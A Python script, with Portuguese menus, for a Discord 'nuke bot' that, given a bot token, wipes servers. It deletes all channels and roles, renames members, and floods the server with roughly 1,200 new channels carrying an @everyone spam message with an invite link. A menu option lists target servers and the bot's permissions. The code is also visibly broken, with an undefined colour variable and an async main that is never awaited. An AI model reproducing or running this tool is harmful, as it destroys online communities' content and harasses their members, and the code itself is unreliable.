import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import time
import itertools

# Inicialização do Colorama
init()

# Cores do Colorama
dr = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

# Função para limpar o terminal
clear = lambda: system('cls') if os_name == 'nt' else system('clear')

# Função personalizada para entrada
def _input(text):
    print(text, end='')
    return input()

# Banner decorado
banner = f'''
{r}██████╗     ██╗  ██╗
{r}██╔══██╗    ██║ ██╔╝
{r}██║  ██║    █████╔╝ 
{r}██║  ██║    ██╔═██╗ 
{r}██████╔╝    ██║  ██╗
{r}╚═════╝     ╚═╝  ╚═╝
{y}Feito por: {g}Menor dk 🇾🇪
'''

# Função para exibir menu com animação
def show_menu():
    clear()
    menu = f'''
{banner}
{c}--------------------------------------------
{b}[Menu]
{y}1 - {g}Executar Setup Nuke Bot
{y}2 - {g}Sair
{y}3 - {g}Parar
{y}4 - {g}Ver Servidores do Bot
{c}--------------------------------------------
'''
    print(menu)

# Função para exibir opções de ataque
def show_attack_options():
    clear()
    options = f'''
{banner}
{c}--------------------------------------------
{b}[Selecione]
{y}1 - {g}Nuke de todos os servidores.
{y}2 - {g}Nuke apenas um servidor.
{y}3 - {g}Sair
{c}--------------------------------------------
'''
    print(options)

async def delete_all_channel(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            continue

async def delete_all_roles(guild):
    for role in guild.roles:
        try:
            await role.delete()
        except:
            continue

async def rename_all_members(guild, name):
    for member in guild.members:
        if not member.guild_permissions.administrator:
            try:
                await member.edit(nick=f'{name} ({member.name})')
            except:
                continue

async def create_text_channels(guild, name, message):
    for _ in range(10):  # Cria 10 canais por vez
        try:
            channel = await guild.create_text_channel(name=name)
            await channel.send(message)  # Envia mensagem no canal criado
        except:
            continue

async def nuke_guild(guild, name, message):
    # Renomeia membros
    await rename_all_members(guild, name)
    
    # Deleta canais
    await delete_all_channel(guild)
    
    # Deleta roles
    await delete_all_roles(guild)
    
    # Cria canais de texto
    created_channels = 0
    while created_channels < 1199:
        await create_text_channels(guild, name, message)
        created_channels += 10
        time.sleep(0.555)  # Atraso para evitar problemas

async def main():
    while True:
        show_menu()
        choice = _input('Escolha uma opção: ')
        
        if choice == '1':
            token = _input(f'{y}Insira o token do bot:{g}')
            name = _input(f'{y}Insira o nome para os canal/nomes ')
            message = '''# DKZIN 🔥🥋🇾🇪
> - TERCEIRO COMANDO DA CAPITAL NA ATIVA,  ENTREM PRA TROPA E SEJAM FELIZES 👑
- https://discord.com/invite/gZSx3n8Csa

> TEMOS OTIMOS HACKS E METHODOS 
> BOTS DE KEY E MUITO MAIS

@here @everyone'''
            
            show_attack_options()
            choice_type = _input(f'{y}Escolha o tipo de ataque:{g}')
            
            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
            
            if choice_type == '1':
                @client.event
                async def on_ready():
                    for guild in client.guilds:
                        await nuke_guild(guild, name, message)
                    await client.close()
            
            elif choice_type == '2':
                guild_id = _input(f'{y}Insira o id do servidor:{g}')
                @client.event
                async def on_ready():
                    for guild in client.guilds:
                        if str(guild.id) == guild_id:
                            await nuke_guild(guild, name, message)
                    await client.close()
            
            elif choice_type == '3':
                exit()
            
            try:
                client.run(token)
                _input('Nuke concluído, pressione Enter para voltar ao menu...')
            except Exception as error:
                _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
        
        elif choice == '2':
            exit()
        
        elif choice == '3':
            clear()
            _input(f'{dr}Bot Parado... Pressione Enter para voltar ao menu...')
        
        elif choice == '4':
            token = _input(f'{y}Insira o token do bot:{g}')
            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
            
            @client.event
            async def on_ready():
                clear()
                for guild in client.guilds:
                    print(f'{r}Servidor: {m}{guild.name}')
                    print(f'{c}ID: {g}{guild.id}')
                    print(f'{b}Membros: {g}{len(guild.members)}')
                    print(f'{y}Canais: {g}{len(guild.channels)}')
                    print(f'{m}Roles: {g}{len(guild.roles)}')
                    perms = guild.me.guild_permissions
                    print(f'{w}Permissões:')
                    print(f'  {c}KICK_MEMBERS: {g}{perms.kick_members}')
                    print(f'  {c}BAN_MEMBERS: {g}{perms.ban_members}')
                    print(f'  {c}MANAGE_CHANNELS: {g}{perms.manage_channels}')
                    print(f'  {c}MANAGE_ROLES: {g}{perms.manage_roles}')
                    print(f'  {c}ADMINISTRATOR: {g}{perms.administrator}')
                    print(f'{c}--------------------------------------------')
                await client.close()
            
            try:
                client.run(token)
                _input('Pressione Enter para voltar ao menu...')
            except Exception as error:
                _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
        
        else:
            _input(f'{r}Opção inválida. Pressione Enter para voltar...')

# Executa o menu principal
main()
